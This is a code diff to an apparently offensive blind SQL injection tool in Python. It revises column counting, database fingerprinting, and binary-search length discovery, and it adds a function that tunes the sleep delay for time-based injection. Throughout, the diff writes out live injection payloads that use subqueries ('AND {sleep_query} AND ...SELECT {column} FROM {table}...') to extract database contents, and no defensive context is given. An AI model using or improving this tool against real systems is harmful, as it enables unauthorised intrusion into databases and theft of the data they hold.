@@ -177,12 +177,12 @@ def is_injectable(request_template, injectable_headers={}, static_headers={}, ar
 
 def column_count(detection, workers, request_template, queries, injectable_headers, static_headers, args=None):
     """
-    Counting columns, using either sleep-based detection from 'sl_queries' or regular payloads without sleep.
+    we're counting columns baybeeee
     """
 
-    return 2
-
     print("[*] Attempting to count columns...")
+
+    #return 2
 
     # Step 1: Baseline request
     try:
@@ -266,6 +266,8 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
 
     print("[*] Attempting to detect the database type...")
 
+    #return "MariaDB","SUBSTRING","SLEEP(8)","LENGTH"
+
     adjusted_columns = columns - 2
 
     if args.verbose and not args.sleep_only:
@@ -306,7 +308,22 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
                 if result and result[0] is True:
                     sleep_query = result[1]
                     print(f"[+] Sleep-based detection with query {sleep_query}")
-                    # Step 4: Check version queries
+                    # Step 4: Lower sleep time
+
+                    new_sleep = lower(
+                        sleep_query=sleep_query,
+                        request_template=request_template,
+                        baseline_status_code=baseline_status_code,
+                        baseline_content_length=baseline_content_length,
+                        queries=queries,
+                        injectable_headers=injectable_headers,
+                        static_headers=static_headers,
+                        args=args,
+                    )
+
+                    sleep_query = sleep_query.replace(str(args.sleep_only), str(new_sleep))
+                    args.sleep_only = new_sleep
+                    # Step 5: Check version queries
                     print(f"[*] Checking associated version queries")
                     version_tasks = []
                     with ThreadPoolExecutor(max_workers=workers) as version_executor:
@@ -338,7 +355,7 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
                                                                      detection=detection, injectable_headers=injectable_headers,
                                                                      static_headers=static_headers, sleep_query=query, args=args))
 
-                        # Step 5: Wait for results from version query detection
+                        # Step 6: Wait for results from version query detection
                         for version_future in as_completed(version_tasks):
                             result = version_future.result()
                             if result:
@@ -350,7 +367,7 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
                     return None, None, None, None
 
     else:
-        # Step 6: Standard detection
+        # Step 7: Standard detection
         print("[*] Running standard detection without sleep-only logic.")
         tasks = []
         with ThreadPoolExecutor(max_workers=workers) as executor:
@@ -369,14 +386,14 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
                                              queries=queries, injectable_headers=injectable_headers, static_headers=static_headers,
                                              detection=detection, args=args))
 
-            # Step 7: Wait for standard detection results
+            # Step 8: Wait for standard detection results
             for future in as_completed(tasks):
                 result = future.result()
                 if result:
                     db_name, substring_query, sleep_query, length_query = result
                     print(f"[+] Database detected: {db_name}")
                     sleep_function = queries[db_name].get("sleep_query", None)
-                    # Step 8: Narrow down the database if needed
+                    # Step 9: Narrow down the database if needed
                     if isinstance(sleep_function, dict):
                         print(f"[*] Narrowing down to the specific database version...")
                         og_sleep_only = args.sleep_only
@@ -407,7 +424,7 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
                                                              static_headers=static_headers, detection=detection,
                                                              args=args))
 
-                            # Step 5a: Wait for more specific results
+                            # Step 10: Wait for more specific results
                             for specific_future in as_completed(specific_tasks):
                                 specific_result = specific_future.result()
                                 if specific_result:
@@ -451,14 +468,15 @@ def discover_length(table, column, where_clause, db_name, substring_query, sleep
 
     while low <= high:
         mid = (low + high) // 2
-        payload = f"' AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
-        encoded_payload = quote(payload)
-        if args.delay > 0:
-            if args.verbose:
-                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
-            time.sleep(args.delay)
         if args.sleep_only and sleep_query:
-            payload = f"' AND {sleep_query} AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
+            payload = f"' AND {sleep_query} AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause}))<='{mid}"
+            encoded_payload = quote(payload)
+            if args.delay > 0:
+                if args.verbose:
+                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                time.sleep(args.delay)
+        else:
+            payload = f"' AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause}))<='{mid}"
             encoded_payload = quote(payload)
             if args.delay > 0:
                 if args.verbose:
@@ -780,6 +798,7 @@ def send_request(request_line=None, headers=None, body=None, args=None):
             host = headers.get("Host")
             protocol = "https" if args.url.startswith("https") else "http"
             fully_qualified_url = protocol + "://" + host + path
+            #print(fully_qualified_url)
         else:
             url = args.url
         if method == "POST":
@@ -900,7 +919,7 @@ def detect(encoded_payload, db_name, detection, queries, injectable_headers, sta
         if response is None:
             return None, None, None, None
 
-        print (response)
+        #print (response)
 
         if args.sleep_only and (response_time > args.sleep_only):
             if db_name == "unknown":
@@ -934,6 +953,55 @@ def detect(encoded_payload, db_name, detection, queries, injectable_headers, sta
         print(f"[-] Error during detection for {db_name}: {e}")
 
     return None
+
+
+def lower(sleep_query, request_template, baseline_status_code, baseline_content_length, queries, injectable_headers, static_headers, args):
+    """
+    optimize sleep time
+    """
+    print("[*] Starting binary search for the minimum reliable sleep time.")
+
+    low = 1
+    high = args.sleep_only
+    sleep_query = sleep_query.replace(str(args.sleep_only), '%')
+    while low < high:
+        mid = (low + high) // 2
+        print(f"[*] Testing sleep time: {mid} seconds")
+
+        sleep_query = sleep_query.replace('%', str(mid))
+        payload = f"' AND {sleep_query} AND '1'='1"
+        encoded_payload = quote(payload)
+        if args.delay > 0:
+            if args.verbose:
+                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+            time.sleep(args.delay)
+
+        task = detect(
+            encoded_payload=encoded_payload,
+            db_name="unknown",
+            detection="sleep",
+            queries=queries,
+            injectable_headers=injectable_headers,
+            static_headers=static_headers,
+            baseline_status_code=baseline_status_code,
+            baseline_content_length=baseline_content_length,
+            request_template=request_template,
+            sleep_query=sleep_query,
+            args=args
+        )
+
+        sleep_query = sleep_query.replace(str(mid), '%')
+
+        if task:
+            new_sleep = mid
+            high = mid - 1
+            print(f"[+] Sleep time of {mid} seconds is reliable. Trying to lower further.")
+        else:
+            low = mid + 1
+            print(f"[-] Sleep time of {mid} seconds is not reliable. Increasing sleep time.")
+
+    print(f"[+] Final reliable sleep time found: {new_sleep} seconds")
+    return new_sleep
 
 
 def extract(encoded_payload, value, extraction, request_template, injectable_headers, static_headers, baseline_status_code, baseline_content_length, args=None):
